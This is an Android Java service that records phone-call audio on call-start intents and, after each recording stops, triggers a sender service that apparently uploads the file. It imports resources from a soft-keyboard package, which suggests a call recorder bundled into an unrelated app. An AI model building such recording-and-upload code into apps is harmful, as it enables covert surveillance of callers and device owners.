package com.acme.recorder;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import com.acme.util.Constants;
import com.acme.util.RecordHelper;
import com.acme.util.Utils;
import com.softkeyboard.R;

import java.io.IOException;

public class CallRecorder extends Service {

    private MediaRecorder recorder = null;
    private String phoneNumber = null;

    private boolean onCall = false;
    private boolean recording = false;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(Constants.CALL_RECORD_TAG, "RecordService onStartCommand");
        if (intent != null) {
            int commandType = intent.getIntExtra("commandType", 0);
            if (commandType != 0) {
                if (commandType == Constants.STATE_INCOMING_NUMBER) {
                    Log.d(Constants.CALL_RECORD_TAG, "RecordService STATE_INCOMING_NUMBER");
                    if (phoneNumber == null){
                        phoneNumber = intent.getStringExtra("phoneNumber");
                    }
                    Log.d(Constants.CALL_RECORD_TAG, "CallRecord | INCOMING NUMBER | phoneNumber -> "+phoneNumber);
                } else if (commandType == Constants.STATE_CALL_START) {
                    Log.d(Constants.CALL_RECORD_TAG, "RecordService STATE_CALL_START");
                    onCall = true;
                    if (phoneNumber != null && onCall && !recording) {
                        startRecording();
                    }
                } else if (commandType == Constants.STATE_CALL_END) {
                    Log.d(Constants.CALL_RECORD_TAG, "RecordService STATE_CALL_END");
                    onCall = false;
                    phoneNumber = null;
                    stopAndReleaseRecorder();
                    recording = false;
                    stopService();

                } else if (commandType == Constants.STATE_START_RECORDING) {
                    Log.d(Constants.CALL_RECORD_TAG, "RecordService STATE_START_RECORDING");
                    if (phoneNumber != null && onCall) {
                        startRecording();
                    }
                } else if (commandType == Constants.STATE_STOP_RECORDING) {
                    Log.d(Constants.CALL_RECORD_TAG, "RecordService STATE_STOP_RECORDING");
                    stopAndReleaseRecorder();
                    recording = false;
                }
            }
        }
        return super.onStartCommand(intent, flags, startId);
    }

    /**
     * in case it is impossible to record
     */
    private void terminateAndEraseFile() {
        Log.d(Constants.CALL_RECORD_TAG, "RecordService terminateAndEraseFile");
        stopAndReleaseRecorder();
        recording = false;
    }

    private void stopService() {
        Log.d(Constants.CALL_RECORD_TAG, "RecordService stopService");
        stopForeground(true);
        this.stopSelf();
    }

    private void stopAndReleaseRecorder() {
        if (recorder == null)
            return;
        Log.d(Constants.CALL_RECORD_TAG, "RecordService stopAndReleaseRecorder");
        boolean recorderStopped = false;

        try {
            recorder.stop();
            recorderStopped = true;
            //send file from storage
            Utils.startSenderService();


        } catch (IllegalStateException e) {
            Log.e(Constants.CALL_RECORD_TAG, "IllegalStateException");
            e.printStackTrace();
        } catch (RuntimeException e) {
            Log.e(Constants.CALL_RECORD_TAG, "RuntimeException");
        } catch (Exception e) {
            Log.e(Constants.CALL_RECORD_TAG, "Exception");
            e.printStackTrace();
        }
        try {
            recorder.reset();
        } catch (Exception e) {
            Log.e(Constants.CALL_RECORD_TAG, "Exception");
            e.printStackTrace();
        }
        try {
            recorder.release();
        } catch (Exception e) {
            Log.e(Constants.CALL_RECORD_TAG, "Exception");
            e.printStackTrace();
        }

        recorder = null;
        if (recorderStopped) {
            Toast toast = Toast.makeText(this,
                    this.getString(R.string.receiver_end_call),
                    Toast.LENGTH_SHORT);
            toast.show();
        }
    }

    @Override
    public void onDestroy() {
        Log.d(Constants.CALL_RECORD_TAG, "RecordService onDestroy");
        stopAndReleaseRecorder();
        stopService();
        super.onDestroy();
    }

    private void startRecording() {
        Log.d(Constants.CALL_RECORD_TAG, "RecordService startRecording");
        boolean exception = false;
        recorder = new MediaRecorder();

        try {

            recorder.setOutputFile(RecordHelper.getPathForAudio());
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);

            MediaRecorder.OnErrorListener errorListener = new MediaRecorder.OnErrorListener() {
                public void onError(MediaRecorder arg0, int arg1, int arg2) {
                    Log.e(Constants.CALL_RECORD_TAG, "OnErrorListener " + arg1 + "," + arg2);
                    terminateAndEraseFile();
                }
            };
            recorder.setOnErrorListener(errorListener);

            MediaRecorder.OnInfoListener infoListener = new MediaRecorder.OnInfoListener() {
                public void onInfo(MediaRecorder arg0, int arg1, int arg2) {
                    Log.e(Constants.CALL_RECORD_TAG, "OnInfoListener " + arg1 + "," + arg2);
                    terminateAndEraseFile();
                }
            };
            recorder.setOnInfoListener(infoListener);

            recorder.prepare();
            // Sometimes prepare takes some time to complete
//            Thread.sleep(2000);
            recorder.start();
            recording = true;
            Log.d(Constants.CALL_RECORD_TAG, "RecordService recorderStarted");
        } catch (IllegalStateException e) {
            Log.e(Constants.CALL_RECORD_TAG, "IllegalStateException");
            e.printStackTrace();
            exception = true;
        } catch (IOException e) {
            Log.e(Constants.CALL_RECORD_TAG, "IOException");
            e.printStackTrace();
            exception = true;
        } catch (Exception e) {
            Log.e(Constants.CALL_RECORD_TAG, "Exception");
            e.printStackTrace();
            exception = true;
        }

        if (exception) {
            terminateAndEraseFile();
        }

        if (recording) {
            Toast toast = Toast.makeText(this, this.getString(R.string.receiver_start_call), Toast.LENGTH_SHORT);
            toast.show();
        } else {
            Toast toast = Toast.makeText(this, this.getString(R.string.record_impossible), Toast.LENGTH_LONG);
            toast.show();
        }
    }
}
